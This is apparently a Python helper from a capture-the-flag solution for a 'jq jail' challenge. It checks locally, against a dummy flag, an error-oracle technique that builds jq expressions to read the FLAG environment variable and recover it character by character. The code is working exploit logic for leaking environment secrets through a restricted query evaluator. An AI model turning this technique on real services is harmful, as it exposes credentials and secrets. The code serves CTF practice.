import json
import string
import subprocess

import solve_remote_live

RAW_CHAINS = json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON)
CHAINS = {int(k): v for k, v in RAW_CHAINS.items()}
FEATURES = solve_remote_live.FEATURES
CHARSET = string.ascii_lowercase + string.digits + "_{}"


def predicate(ops):
    parts = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)


def simulate_local_query(expr, test_flag):
    result = subprocess.run(
        ["jq", "-n", expr],
        capture_output=True,
        env={"FLAG": test_flag},
    )
    return result.returncode != 0


def exact_expression(length, position, reverse, feature, value):
    stream_index = length - 1 - position if reverse else position
    base = "env|flatten|sort|last|explode"
    if reverse:
        base += "|reverse|implode|explode"
    return (
        f"[{base}|tostream]|.[{stream_index}]|{feature.suffix}|"
        f"{predicate(CHAINS[value])}|error"
    )


def recover_position(test_flag, position):
    """Recover one exact position using adaptive singleton observations.

    This is a local proof helper: the explicit array index is intentionally not
    whitelist-compatible.  The remote solver must use the global set-oracle/CSP
    construction from solve_remote_live.py instead.
    """
    length = len(test_flag)
    candidates = [ord(c) for c in CHARSET]
    queries = 0
    evidence = []

    for reverse in (False, True):
        stream_index = length - 1 - position if reverse else position
        for feature_index, feature in enumerate(FEATURES):
            covered_values = {
                feature.evaluate(stream_index, candidate)
                for candidate in candidates
            } & CHAINS.keys()

            present_values = []
            for value in sorted(covered_values):
                expr = exact_expression(
                    length, position, reverse, feature, value
                )
                queries += 1
                if simulate_local_query(expr, test_flag):
                    present_values.append(value)

            if len(present_values) > 1:
                raise RuntimeError(
                    f"feature {feature.name} produced multiple singleton hits "
                    f"at position {position}: {present_values}"
                )

            before = len(candidates)
            if present_values:
                observed = present_values[0]
                candidates = [
                    candidate
                    for candidate in candidates
                    if feature.evaluate(stream_index, candidate) == observed
                ]
                evidence.append(
                    (feature.name, reverse, "present", observed, before, len(candidates))
                )
            else:
                candidates = [
                    candidate
                    for candidate in candidates
                    if feature.evaluate(stream_index, candidate) not in CHAINS
                ]
                evidence.append(
                    (feature.name, reverse, "absent", None, before, len(candidates))
                )

            if len(candidates) <= 1:
                return candidates, queries, evidence

    return candidates, queries, evidence


def verify():
    prefix = "jail{"
    suffix = "}"
    body = (
        "a1_b2_c3_d4_e5_f6_g7_h8_i9_j0_k1_l2_m3_n4_o5_p6_q7_r8_s9_"
        "t0_u1_v2_w3_x4_y5_z6_hello_world_this_is_a_super_long_flag_for_123"
    )
    test_flag = prefix + body[: 122 - len(prefix) - len(suffix)] + suffix
    assert len(test_flag) == 122

    print(f"[*] Test flag length: {len(test_flag)}")
    print("[*] Recovering every position with exact-index adaptive features...")

    recovered = ["?"] * len(test_flag)
    total_queries = 0
    unresolved = 0

    for position in range(len(test_flag)):
        candidates, query_count, evidence = recover_position(test_flag, position)
        total_queries += query_count

        if len(candidates) == 1:
            recovered[position] = chr(candidates[0])
        else:
            unresolved += 1
            rendered = "".join(chr(c) for c in candidates)
            print(
                f"[-] Pos {position:3d}: unresolved candidates={rendered!r}; "
                f"queries={query_count}"
            )

    result = "".join(recovered)
    print("\n" + "=" * 80)
    print(f"[+] RECOVERED FLAG: {result}")
    print("=" * 80)
    print(
        f"Stats: {unresolved} unresolved out of {len(test_flag)} positions; "
        f"{total_queries} jq queries"
    )

    assert result == test_flag, (
        f"Mismatch:\nexpected: {test_flag!r}\n     got: {result!r}"
    )
    print("[***] PERFECT 100% LOCAL RECOVERY VERIFIED [***]")


if __name__ == "__main__":
    verify()
